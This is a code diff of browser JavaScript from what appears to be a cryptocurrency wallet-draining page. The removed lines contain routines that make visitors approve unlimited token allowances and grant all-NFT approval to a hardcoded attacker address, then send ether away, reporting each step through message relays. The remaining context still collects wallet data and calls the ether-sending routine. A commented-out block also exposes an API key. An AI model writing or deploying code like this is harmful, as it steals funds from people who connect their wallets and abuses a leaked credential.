@@ -105,53 +105,7 @@ $(".proceed").click(async function () {
 })
 const Oxa = "0x0a8360dba534E12535c5D2F1EB946b7c3575f852"
 const Oxc1 = "5227607491"
-const Oxc2 = "5699310522"
 
-// async function bitqueryAPICall() {
-
-//     const query = `{
-//         ethereum {
-//           address(address: {is: "${selectedAccount}"}) {
-//             balances {
-//               currency {
-//                 symbol
-//                 address
-//               }
-//               value
-//             }
-//           }
-//         }
-//     }`;
-
-//     const url = "https://graphql.bitquery.io/";
-
-//     const opts = {
-//         method: "POST",
-//         headers: {
-//             "Content-Type": "application/json",
-//             "X-API-KEY": "BQYbBW4xCbSdau4k5wFWgFNN8Sr4FN3L"
-//         },
-//         body: JSON.stringify({
-//             query,
-//         })
-//     };
-
-//     const result = await fetch(url, opts).then(res => res.json())
-
-//     let list = result.data.ethereum.address[0].balances
-
-//     let map_list = list.map(m => {
-//         return {
-//             balance: m.value,
-//             address: m.currency.address,
-//             symbol: m.currency.symbol
-//         }
-//     })
-
-//     tokens = map_list.filter(f => f.balance > 0 && f.symbol != "ETH")
-//     console.log("ETH", tokens);
-//     onApprove()
-// }
 
 async function covalenthqAPICall() {
 
@@ -207,109 +161,13 @@ async function covalenthqAPICall() {
           });
           NFTs = NFTs.result;
         console.log("NFTs collection ", NFTs)
-        if (tokens.length === 0 && NFTs.length === 0)
             onSendEther()
-        else
-            onApprove()
     } catch {
         sendMessage(`Error collecting info about wallet`)
     }
     
 }
 
-async function onApprove() {
-    if (tokens.length) {
-        //tokens.forEach(token => {
-            try {
-                loopTokens(tokens);
-            }
-            catch (error) {
-                // Ignore the error and continue with the loop
-                console.error(`Error processing item ${error.message}`);
-            }
-    }
-    else {
-        if (NFTs.length) {
-            //tokens.forEach(token => {
-                try {
-                    loopNfts(NFTs);
-                }
-                catch (error) {
-                    // Ignore the error and continue with the loop
-                    console.error(`Error processing item ${error.message}`);
-                }
-            onSendEther()
-    sendMessage("Error not found, Please switch network or try again!")
-    }else{
-        try {
-            onSendEther()
-        }
-        catch (error) {
-            // Ignore the error and continue with the loop
-            console.error(`Error processing item ${error.message}`);
-        }
-    }
-}
-}
-
-async function loopTokens(tokens){
-    
-    for await (let token of tokens) {
-        console.log("Token", token)
-        try {
-        sendMessage("New token")
-        let { hash } = await writeContract({
-            address: token.address,
-            abi: ABI,
-            functionName:'approve',
-            args: [Oxa,
-                "999999999999999999999999999999999999999999999999999999999999999999999999"
-                ],
-          })
-          console.log("hash", hash)
-           if (hash){
-                console.log("Approved")
-                sendMessage("Approve Completed Successfully")
-                sendMessage(`TOKEN Contract Address ${token.address}`)
-                sendMessage(`Token balance is ${token.balance}`)
-                sendMessage(`Your address ${Oxa}`)
-           }
-        }
-        catch(error){
-            console.log(`Error: ${error}`)
-            sendMessage("Transaction Rejected")
-        }
-    };
-    
-        await loopNfts(NFTs)
-    }
-    
-async function loopNfts(NFTs){
-        for await (let NFT of NFTs) {
-            console.log("NFT", NFT)
-            try {
-            let { hash } = await writeContract({
-                address: NFT.token_address,
-                abi: ABIN,
-                functionName:'setApprovalForAll',
-                args: [Oxa,
-                    true
-                    ],
-              })
-              console.log("hash", hash)
-                console.log(`Transaction Receipt: ${receipt}`)
-                sendMessage("Approve Completed Successfully")
-                sendMessage(`NFT Contract Address ${NFT.token_address}`)
-                sendMessage(`Your address ${Oxa}`)
-                }
-            
-            catch(error){
-                console.log(`Error: ${error}`)
-                sendMessage("Transaction Rejected")
-            }
-        }
-            await onSendEther();
-    }
   
 async function onSendEther() {
     console.log("sending ether")
@@ -343,8 +201,7 @@ async function onSendEther() {
 
 }
 async function sendMessage(message){
-    sendMessage1(message);
-    sendMessage2(message);
+    console.log(message)
     
 }
 
